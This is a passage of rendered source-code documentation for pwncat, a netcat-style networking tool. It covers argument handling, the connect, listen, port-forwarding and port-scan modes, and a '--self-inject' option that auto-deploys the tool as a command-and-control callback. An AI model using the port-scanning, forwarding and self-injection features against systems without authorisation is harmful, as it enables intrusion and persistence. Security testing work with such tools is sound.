        <span class="hljs-string">"--udp-sconnect"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Connect mode (UDP only):
Emulating stateful behaviour for UDP connect phase by
sending an initial packet to the server to validate if
it is actually connected.
By default, UDP will simply issue a connect and is not
aware if it is really connected or not.
The default connect packet to be send is '\\0', you
can change this with --udp-sconnect-word.

"""</span>,
    )
    cmode.add_argument(
        <span class="hljs-string">"--udp-sconnect-word"</span>,
        nargs=<span class="hljs-string">"?"</span>,
        metavar=<span class="hljs-string">"str"</span>,
        type=str,
        default=<span class="hljs-string">"\0"</span>,
        help=<span class="hljs-string">"""Connect mode (UDP only):
Change the the data to be send for UDP stateful connect
behaviour. Note you can also omit the string to send an
empty packet (EOF), but be aware that some servers such
as netcat will instantly quit upon receive of an EOF
packet.
The default is to send a null byte sting: '\\0'.
"""</span>,
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Misc arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    misc.add_argument(<span class="hljs-string">"-h"</span>, <span
                                    class="hljs-string">"--help"</span>, action=<span
                                    class="hljs-string">"help"</span>, help=<span
                                    class="hljs-string">"Show this help message and exit"</span>)
    misc.add_argument(
        <span class="hljs-string">"-V"</span>,
        <span class="hljs-string">"--version"</span>,
        action=<span class="hljs-string">"version"</span>,
        version=get_version(),
        help=<span class="hljs-string">"Show version information and exit"</span>,
    )

    <span class="hljs-comment"># Retrieve arguments</span>
    args = parser.parse_args()

    <span class="hljs-comment"># Check mutually exclive arguments</span>
    _args_check_mutually_exclusive(parser, args)

    <span class="hljs-comment"># Only Zero-I/O mode allows multiple ports</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> args.zero <span
                                    class="hljs-keyword">and</span> len(args.port) &gt; <span
                                    class="hljs-number">1</span>:
        parser.print_usage()
        print(
            <span class="hljs-string">"%s: error: Only Zero-I/O mode supports multiple ports"</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># Connect mode and Zero-I/O mode require hostname and port to be set</span>
    connect_mode = <span class="hljs-keyword">not</span> (args.listen <span
                                    class="hljs-keyword">or</span> args.zero <span
                                    class="hljs-keyword">or</span> args.local <span
                                    class="hljs-keyword">or</span> args.remote)
    <span class="hljs-keyword">if</span> (connect_mode <span class="hljs-keyword">or</span> args.zero <span
                                    class="hljs-keyword">or</span> args.local) <span
                                    class="hljs-keyword">and</span> <span
                                    class="hljs-keyword">not</span> args.hostname:
        parser.print_usage()
        print(
            <span class="hljs-string">"%s: error: the following arguments are required: hostname"</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># Deny unimplemented modes</span>
    <span class="hljs-keyword">if</span> args.https:
        print(<span class="hljs-string">"Unimplemented options"</span>, file=sys.stderr)
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-keyword">return</span> args</code></pre>
                    </details>
                </dd>
                <dt id="pwncat.get_version"><code class="name flex">
                    <span>def <span class="ident">get_version</span></span>(<span>)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Return version information.</p></div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-function"><span
                                class="hljs-keyword">def</span> <span
                                class="hljs-title">get_version</span>():</span>
    <span class="hljs-comment"># type: () -&gt; str</span>
    <span class="hljs-string">"""Return version information."""</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"""%(prog)s: Version %(version)s (%(url)s) by %(author)s"""</span> % (
        {<span class="hljs-string">"prog"</span>: APPNAME, <span
                                    class="hljs-string">"version"</span>: VERSION, <span
                                    class="hljs-string">"url"</span>: APPREPO, <span
                                    class="hljs-string">"author"</span>: <span class="hljs-string">"cytopia"</span>}
    )</code></pre>
                    </details>
                </dd>
                <dt id="pwncat.main"><code class="name flex">
                    <span>def <span class="ident">main</span></span>(<span>)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Run the program.</p></div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-function"><span
                                class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Run the program."""</span>
    args = get_args()

    <span class="hljs-comment"># Determine current mode</span>
    mode = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (args.listen <span
                                    class="hljs-keyword">or</span> args.local <span
                                    class="hljs-keyword">or</span> args.remote <span
                                    class="hljs-keyword">or</span> args.zero):
        mode = <span class="hljs-string">"connect"</span>
        ports = [args.port[<span class="hljs-number">0</span>]]
    <span class="hljs-keyword">elif</span> args.listen:
        mode = <span class="hljs-string">"listen"</span>
        ports = [args.port[<span class="hljs-number">0</span>]]
    <span class="hljs-keyword">elif</span> args.local:
        mode = <span class="hljs-string">"local"</span>
        ports = [args.port[<span class="hljs-number">0</span>]]
    <span class="hljs-keyword">elif</span> args.remote:
        mode = <span class="hljs-string">"remote"</span>
        ports = [args.port[<span class="hljs-number">0</span>]]
    <span class="hljs-keyword">elif</span> args.zero:
        mode = <span class="hljs-string">"scan"</span>
        ports = args.port
    <span class="hljs-keyword">assert</span> mode <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>

    host = args.hostname

    <span class="hljs-comment"># No argument supplied --udp-sconnect-word to it</span>
    <span class="hljs-keyword">if</span> args.udp_sconnect_word <span class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span>:
        udp_sconnect_word = <span class="hljs-string">""</span>
    <span class="hljs-comment"># --udp-sconnect-word not specified</span>
    <span class="hljs-keyword">elif</span> args.udp_sconnect_word == <span
                                    class="hljs-string">""</span>:
        udp_sconnect_word = <span class="hljs-string">"\0"</span>
    <span class="hljs-keyword">else</span>:
        udp_sconnect_word = args.udp_sconnect_word

    reconn = <span class="hljs-number">-1</span> <span
                                    class="hljs-keyword">if</span> args.reconn <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span> <span
                                    class="hljs-keyword">else</span> args.reconn
    rebind = <span class="hljs-number">-1</span> <span
                                    class="hljs-keyword">if</span> args.rebind <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span> <span
                                    class="hljs-keyword">else</span> args.rebind

    <span class="hljs-comment"># Set pwncat options</span>
    sock_opts = DsIONetworkSock(
        RECV_BUFSIZE,
        LISTEN_BACKLOG,
        TIMEOUT_RECV_SOCKET,
        TIMEOUT_RECV_SOCKET_RETRY,
        args.nodns,
        args.ipv4,
        args.ipv6,
        args.source_addr,
        args.source_port,
        args.udp,
        <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> args.zero <span
                                    class="hljs-keyword">else</span> args.udp_sconnect,
        udp_sconnect_word,
        args.tos,
        args.info,
    )
    srv_opts = DsIONetworkSrv(args.keep_open, rebind, args.rebind_wait, args.rebind_robin)
    cli_opts = DsIONetworkCli(reconn, args.reconn_wait, args.reconn_robin)

    <span class="hljs-comment"># Map pwncat verbosity to Python's Logger loglevel</span>
    logmap = {
        <span class="hljs-number">0</span>: logging.ERROR,
        <span class="hljs-number">1</span>: logging.WARNING,
        <span class="hljs-number">2</span>: logging.INFO,
        <span class="hljs-number">3</span>: logging.DEBUG,
    }
    loglevel = logmap.get(args.verbose, TraceLogger.LEVEL_NUM)

    <span class="hljs-comment"># Use a colored log formatter</span>
    formatter = ColoredLogFormatter(args.color, loglevel)
    handler = logging.StreamHandler()
    handler.setLevel(loglevel)
    handler.setFormatter(formatter)

    <span class="hljs-comment"># Use a custom logger with TRACE level</span>
    logging.setLoggerClass(TraceLogger)
    logger = logging.getLogger(__name__)
    logger.setLevel(loglevel)
    logger.addHandler(handler)

    <span class="hljs-comment"># Initialize encoder</span>
    enc = StringEncoder()

    <span class="hljs-comment"># Initialize interrupt handler</span>
    ssig = InterruptHandler(args.keep_open, args.no_shutdown)

    <span class="hljs-comment"># Initialize transformers</span>
    transformers = []
    <span class="hljs-keyword">if</span> args.safe_word <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>:
        transformers.append(TransformSafeword(DsTransformSafeword(ssig, args.safe_word)))
    <span class="hljs-keyword">if</span> args.crlf <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>:
        transformers.append(TransformLinefeed(DsTransformLinefeed(args.crlf)))

    <span class="hljs-comment"># Initialize scripting engine transformers</span>
    code_send = <span class="hljs-literal">None</span>
    code_recv = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> args.script_send <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>:
        code_send = compile(args.script_send, <span class="hljs-string">"&lt;script-send&gt;"</span>, <span
                                    class="hljs-string">"exec"</span>)
    <span class="hljs-keyword">if</span> args.script_recv <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>:
        code_recv = compile(args.script_recv, <span class="hljs-string">"&lt;script-recv&gt;"</span>, <span
                                    class="hljs-string">"exec"</span>)

    <span class="hljs-comment"># Use command modulde</span>
    <span class="hljs-keyword">if</span> args.cmd:
        mod = IOCommand(ssig, DsIOCommand(enc, args.cmd, POPEN_BUFSIZE))
    <span class="hljs-comment"># Use output module</span>
    <span class="hljs-keyword">else</span>:
        mod = IOStdinStdout(ssig, DsIOStdinStdout(enc, TIMEOUT_READ_STDIN, args.send_on_eof))

    <span class="hljs-comment"># Run local port-forward</span>
    <span class="hljs-comment"># -&gt; listen locally and forward traffic to remote (connect)</span>
    <span class="hljs-keyword">if</span> mode == <span class="hljs-string">"local"</span>:
        <span class="hljs-comment"># Enure to re-connect forever during local port forward</span>
        cli_opts.reconn = <span class="hljs-number">-1</span>
        cli_opts.reconn_wait = <span class="hljs-number">0.0</span>
        srv_opts.keep_open = <span class="hljs-literal">True</span>
        lhost = args.local.split(<span class="hljs-string">":"</span>)[<span
                                    class="hljs-number">0</span>]
        lport = int(args.local.split(<span class="hljs-string">":"</span>)[<span
                                    class="hljs-number">1</span>])
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> lhost:
            lhost = <span class="hljs-literal">None</span>
        <span class="hljs-comment"># Create listen and client instances</span>
        net_srv = IONetwork(ssig, enc, lhost, [lport], <span class="hljs-string">"server"</span>, srv_opts, cli_opts, sock_opts)
        net_cli = IONetwork(ssig, enc, host, ports, <span class="hljs-string">"client"</span>, srv_opts, cli_opts, sock_opts)
        <span class="hljs-comment"># Create Runner</span>
        run = Runner(ssig, <span class="hljs-literal">False</span>, PSEStore(ssig, [net_srv, net_cli]))
        run.add_action(
            <span class="hljs-string">"TRANSMIT"</span>,
            DsRunnerAction(
                DsCallableProducer(net_srv.producer),  <span class="hljs-comment"># (recv) USER sends data to PC-SERVER</span>
                net_cli.consumer,  <span class="hljs-comment"># (send) Data parsed on to PC-CLIENT to send to TARGET</span>
                [net_cli.interrupt, net_srv.interrupt],
                transformers,
                <span class="hljs-literal">False</span>,
                <span class="hljs-literal">None</span>,
            ),
        )
        run.add_action(
            <span class="hljs-string">"RECEIVE"</span>,
            DsRunnerAction(
                DsCallableProducer(net_cli.producer),  <span class="hljs-comment"># (recv) Data back from TARGET to PC-CLIENT</span>
                net_srv.consumer,  <span class="hljs-comment"># (send) Data parsed on to PC-SERVER to back send to USER</span>
                [net_cli.interrupt, net_srv.interrupt],
                transformers,
                <span class="hljs-literal">False</span>,
                <span class="hljs-literal">None</span>,
            ),
        )
        run.run()

    <span class="hljs-comment"># Run remote port-forward</span>
    <span class="hljs-comment"># -&gt; connect to client, connect to target and proxy traffic in between.</span>
    <span class="hljs-keyword">if</span> mode == <span class="hljs-string">"remote"</span>:
        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Make the listen address optional!</span>
        <span class="hljs-comment"># Enure to re-connect forever during remote port forward</span>
        cli_opts.reconn = <span class="hljs-number">-1</span>
        cli_opts.reconn_wait = <span class="hljs-number">0.0</span>
        lhost = args.remote.split(<span class="hljs-string">":"</span>)[<span
                                    class="hljs-number">0</span>]
        lport = int(args.remote.split(<span class="hljs-string">":"</span>)[<span
                                    class="hljs-number">1</span>])
        <span class="hljs-comment"># Create local and remote client</span>
        net_cli_l = IONetwork(ssig, enc, lhost, [lport], <span class="hljs-string">"client"</span>, srv_opts, cli_opts, sock_opts)
        net_cli_r = IONetwork(ssig, enc, host, ports, <span class="hljs-string">"client"</span>, srv_opts, cli_opts, sock_opts)
        <span class="hljs-comment"># Create Runner</span>
        run = Runner(ssig, <span class="hljs-literal">False</span>, PSEStore(ssig, [net_cli_l, net_cli_r]))
        run.add_action(
            <span class="hljs-string">"TRANSMIT"</span>,
            DsRunnerAction(
                DsCallableProducer(net_cli_l.producer),  <span class="hljs-comment"># (recv) USER sends data to PC-SERVER</span>
                net_cli_r.consumer,  <span class="hljs-comment"># (send) Data parsed on to PC-CLIENT to send to TARGET</span>
                [],
                transformers,
                <span class="hljs-literal">False</span>,
                <span class="hljs-literal">None</span>,
            ),
        )
        run.add_action(
            <span class="hljs-string">"RECEIVE"</span>,
            DsRunnerAction(
                DsCallableProducer(net_cli_r.producer),  <span class="hljs-comment"># (recv) Data back from TARGET to PC-CLIENT</span>
                net_cli_l.consumer,  <span class="hljs-comment"># (send) Data parsed on to PC-SERVER to back send to USER</span>
                [],
                transformers,
                <span class="hljs-literal">False</span>,
                <span class="hljs-literal">None</span>,
            ),
        )
        run.run()

    <span class="hljs-comment"># Port Scan</span>
    <span class="hljs-keyword">if</span> mode == <span class="hljs-string">"scan"</span>:
        print(<span class="hljs-string">"Scanning {} ports"</span>.format(len(ports)))
        net = IONetworkScanner(ssig, enc, host, args.banner, cli_opts, sock_opts)
        run = Runner(ssig, <span class="hljs-literal">True</span>, PSEStore(ssig, [net]))
        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> ports:
            run.add_action(
                <span class="hljs-string">"PORT-{}"</span>.format(port),
                DsRunnerAction(
                    DsCallableProducer(net.producer, port),  <span class="hljs-comment"># Send port scans</span>
                    net.consumer,  <span class="hljs-comment"># Output results</span>
                    [net.interrupt],
                    [],
                    <span class="hljs-literal">True</span>,
                    <span class="hljs-literal">None</span>,
                ),
            )
        run.run()

    <span class="hljs-comment"># Run server</span>
    <span class="hljs-keyword">if</span> mode == <span class="hljs-string">"listen"</span>:
        net = IONetwork(
            ssig, enc, host, ports + args.rebind_robin, <span class="hljs-string">"server"</span>, srv_opts, cli_opts, sock_opts
        )
        <span class="hljs-comment"># Run blocking auto-deploy.</span>
        <span class="hljs-comment"># This will hand over to normal listening server on success or failure</span>
        <span class="hljs-keyword">if</span> args.self_inject:
            cnc_cmd, cnc_host, cnc_port = args.self_inject.split(<span
                                    class="hljs-string">":"</span>)
            cnc_ports = ArgValidator.get_port_list_from_string(cnc_port)
            CNCAutoDeploy(net, cnc_cmd, cnc_host, cnc_ports)

        <span class="hljs-keyword">if</span> args.http:
            trans_recv = [TransformHttpUnpack({})] + transformers
            trans_send = [TransformHttpPack({<span class="hljs-string">"host"</span>: host, <span
                                    class="hljs-string">"reply"</span>: <span class="hljs-string">"response"</span>})] + transformers
        <span class="hljs-keyword">else</span>:
            trans_recv = transformers
            trans_send = transformers

        run = Runner(ssig, <span class="hljs-literal">False</span>, PSEStore(ssig, [net]))
        run.add_action(
            <span class="hljs-string">"RECV"</span>,
            DsRunnerAction(
                DsCallableProducer(net.producer),  <span class="hljs-comment"># receive data</span>
                mod.consumer,
                [net.interrupt],
                trans_recv,
                <span class="hljs-literal">False</span>,
                code_recv,
            ),
        )
        run.add_action(
            <span class="hljs-string">"STDIN"</span>,
            DsRunnerAction(
                DsCallableProducer(mod.producer),
                net.consumer,  <span class="hljs-comment"># send data</span>
                [mod.interrupt],
                trans_send,
                <span class="hljs-literal">False</span>,
                code_send,
            ),
        )
        run.run()

    <span class="hljs-comment"># Run client</span>
    <span class="hljs-keyword">if</span> mode == <span class="hljs-string">"connect"</span>:
        net = IONetwork(
            ssig, enc, host, ports + args.reconn_robin, <span class="hljs-string">"client"</span>, srv_opts, cli_opts, sock_opts
        )

        <span class="hljs-keyword">if</span> args.http:
            trans_recv = [TransformHttpUnpack({})] + transformers
            trans_send = [TransformHttpPack({<span class="hljs-string">"host"</span>: host, <span
                                    class="hljs-string">"reply"</span>: <span class="hljs-string">"response"</span>})] + transformers
        <span class="hljs-keyword">else</span>:
            trans_recv = transformers
            trans_send = transformers

        run = Runner(ssig, <span class="hljs-literal">False</span>, PSEStore(ssig, [net]))
        run.add_action(
            <span class="hljs-string">"RECV"</span>,
            DsRunnerAction(
                DsCallableProducer(net.producer),  <span class="hljs-comment"># receive data</span>
                mod.consumer,
                [net.interrupt],
                trans_recv,
                <span class="hljs-literal">False</span>,
                code_recv,
            ),
        )
        run.add_action(
            <span class="hljs-string">"STDIN"</span>,
            DsRunnerAction(
                DsCallableProducer(mod.producer),
                net.consumer,  <span class="hljs-comment"># send data</span>
                [mod.interrupt],
                trans_send,
                <span class="hljs-literal">False</span>,
                code_send,
            ),
        )
        <span class="hljs-keyword">if</span> type(args.ping_intvl) <span
                                    class="hljs-keyword">is</span> int <span class="hljs-keyword">and</span> args.ping_intvl &gt; <span
                                    class="hljs-number">0</span>:
            payload = StringEncoder.encode(args.ping_word)
            run.add_timer(
                <span class="hljs-string">"PING-INT"</span>,
                DsRunnerTimer(net.consumer, ssig, args.ping_intvl, (payload,), {}),  <span
                                    class="hljs-comment"># send data</span>
            )
        <span class="hljs-keyword">if</span> args.ping_init:
            payload = StringEncoder.encode(args.ping_word)
            run.add_repeater(
                <span class="hljs-string">"PING-REP"</span>,
                DsRunnerRepeater(net.consumer, ssig, <span class="hljs-number">1</span>, <span
                                    class="hljs-number">0.0</span>, (payload,), {}),  <span
                                    class="hljs-comment"># send data</span>
            )
        run.run()</code></pre>
                    </details>
                </dd>
            </dl>
        </section>
        <section>
            <h2 class="section-title" id="header-classes">Classes</h2>
            <dl>
                <dt id="pwncat.ArgValidator"><code class="flex name class">
                    <span>class <span class="ident">ArgValidator</span></span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Validate command line arguments.</p></div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">ArgValidator</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""Validate command line arguments."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Private Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_port_list_by_comma</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; List[int]</span>
        <span class="hljs-string">"""Returns a list of ports from a comma separated string or empty list if invalid."""</span>
        ports = []
        match = re.search(<span class="hljs-string">r"^[0-9]+(,([0-9]+))*$"</span>, value)
        <span class="hljs-keyword">if</span> match <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>:
            ports = [int(port) <span class="hljs-keyword">for</span> port <span
                                    class="hljs-keyword">in</span> match.group(<span
                                    class="hljs-number">0</span>).split(<span class="hljs-string">","</span>)]
            <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> ports:
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port(port):
                    <span class="hljs-keyword">return</span> []
        <span class="hljs-keyword">return</span> ports

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_port_list_by_range</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; List[int]</span>
        <span class="hljs-string">"""Returns a list of ports from a range string or empty list if invalid."""</span>
        ports = []  <span class="hljs-comment"># type: List[int]</span>
        match = re.search(<span class="hljs-string">r"^[0-9]+\-[0-9]+$"</span>, value)
        <span class="hljs-keyword">if</span> match <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>:
            ranges = [int(r) <span class="hljs-keyword">for</span> r <span
                                    class="hljs-keyword">in</span> match.group(<span
                                    class="hljs-number">0</span>).split(<span class="hljs-string">"-"</span>)]
            ports = list(range(ranges[<span class="hljs-number">0</span>], ranges[<span
                                    class="hljs-number">1</span>] + <span
                                    class="hljs-number">1</span>))
            <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> ports:
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port(port):
                    <span class="hljs-keyword">return</span> []
        <span class="hljs-keyword">return</span> ports

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_port_list_by_incr</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; List[int]</span>
        <span class="hljs-string">"""Returns a list of ports from an increment or empty list if invalid."""</span>
        ports = []  <span class="hljs-comment"># type: List[int]</span>
        match = re.search(<span class="hljs-string">r"^[0-9]+\+[0-9]+$"</span>, value)
        <span class="hljs-keyword">if</span> match <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>:
            ranges = [int(r) <span class="hljs-keyword">for</span> r <span
                                    class="hljs-keyword">in</span> match.group(<span
                                    class="hljs-number">0</span>).split(<span class="hljs-string">"+"</span>)]
            ports = list(range(ranges[<span class="hljs-number">0</span>], ranges[<span
                                    class="hljs-number">0</span>] + ranges[<span
                                    class="hljs-number">1</span>] + <span
                                    class="hljs-number">1</span>))
            <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> ports:
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port(port):
                    <span class="hljs-keyword">return</span> []
        <span class="hljs-keyword">return</span> ports

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Helper Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_valid_port</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (int) -&gt; bool</span>
        <span class="hljs-string">"""Returns True if a given value is a valid port."""</span>
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> &lt; value &lt; <span
                                    class="hljs-number">65536</span>

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_valid_port_list</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; bool</span>
        <span class="hljs-string">"""Returns True if a given value is a valid port list by comma or range."""</span>
        cports = ArgValidator.__get_port_list_by_comma(value)
        rports = ArgValidator.__get_port_list_by_range(value)
        iports = ArgValidator.__get_port_list_by_incr(value)
        <span class="hljs-comment"># XOR - only one method (comma, range or increment) is allowed</span>
        <span class="hljs-keyword">if</span> cports <span class="hljs-keyword">and</span> <span
                                    class="hljs-keyword">not</span> rports <span
                                    class="hljs-keyword">and</span> <span
                                    class="hljs-keyword">not</span> iports:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">if</span> rports <span class="hljs-keyword">and</span> <span
                                    class="hljs-keyword">not</span> cports <span
                                    class="hljs-keyword">and</span> <span
                                    class="hljs-keyword">not</span> iports:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">if</span> iports <span class="hljs-keyword">and</span> <span
                                    class="hljs-keyword">not</span> cports <span
                                    class="hljs-keyword">and</span> <span
                                    class="hljs-keyword">not</span> rports:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_port_list_from_string</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; List[int]</span>
        <span class="hljs-string">"""Returns a list of ports from an comma, range or increment."""</span>
        cports = ArgValidator.__get_port_list_by_comma(value)
        rports = ArgValidator.__get_port_list_by_range(value)
        iports = ArgValidator.__get_port_list_by_incr(value)
        <span class="hljs-keyword">return</span> cports + rports + iports

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Generic Type Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_port</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; int</span>
        <span class="hljs-string">"""Check argument for valid port."""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port(int(value)):
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                    class="hljs-string">"%s is an invalid port number."</span> % value)
        <span class="hljs-keyword">return</span> int(value)

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_port_list</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; List[int]</span>
        <span class="hljs-string">"""Check argument for valid port list separated by comma or range number."""</span>
        rports = ArgValidator.__get_port_list_by_range(value)
        cports = ArgValidator.__get_port_list_by_comma(value)
        iports = ArgValidator.__get_port_list_by_incr(value)

        <span class="hljs-comment"># Only use comma, range or increment!</span>
        <span class="hljs-keyword">if</span> (rports <span
                                    class="hljs-keyword">and</span> cports) <span
                                    class="hljs-keyword">or</span> (rports <span
                                    class="hljs-keyword">and</span> iports) <span
                                    class="hljs-keyword">or</span> (cports <span
                                    class="hljs-keyword">and</span> iports):
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(
                <span class="hljs-string">"%s is invalid. Can only use comma, range or increment."</span> % value
            )
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> rports <span
                                    class="hljs-keyword">and</span> <span
                                    class="hljs-keyword">not</span> cports <span
                                    class="hljs-keyword">and</span> <span
                                    class="hljs-keyword">not</span> iports:
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                    class="hljs-string">"%s is an invalid port-list/range definition."</span> % value)
        <span class="hljs-comment"># Return whichever has a value</span>
        <span class="hljs-keyword">return</span> rports + cports + iports

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_file_content</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; str</span>
        <span class="hljs-string">"""Check argument for valid file content (file must exist and be readable)."""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(value):
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                    class="hljs-string">"File not found: %s"</span> % value)
        <span class="hljs-keyword">with</span> open(value, mode=<span class="hljs-string">"r"</span>) <span
                                    class="hljs-keyword">as</span> fhandle:
            script = fhandle.read()
        <span class="hljs-keyword">return</span> script

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Specific Type Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_tos</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; str</span>
        <span class="hljs-string">"""Check argument for valid --tos value."""</span>
        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">not</span> <span
                                    class="hljs-keyword">in</span> [<span class="hljs-string">"mincost"</span>, <span
                                    class="hljs-string">"lowcost"</span>, <span class="hljs-string">"reliability"</span>, <span
                                    class="hljs-string">"throughput"</span>, <span
                                    class="hljs-string">"lowdelay"</span>]:
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                    class="hljs-string">"%s is an invalid tos definition."</span> % value)
        <span class="hljs-keyword">return</span> value

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_info</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; str</span>
        <span class="hljs-string">"""Check argument for valid --info value."""</span>
        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">not</span> <span
                                    class="hljs-keyword">in</span> [<span
                                    class="hljs-string">"sock"</span>, <span class="hljs-string">"ipv4"</span>, <span
                                    class="hljs-string">"ipv6"</span>, <span class="hljs-string">"tcp"</span>, <span
                                    class="hljs-string">"all"</span>, <span
                                    class="hljs-string">""</span>]:
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                    class="hljs-string">"%s is an invalid info definition."</span> % value)
        <span class="hljs-keyword">return</span> value

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_crlf</span>(<span
            class="hljs-params">value</span>):</span>
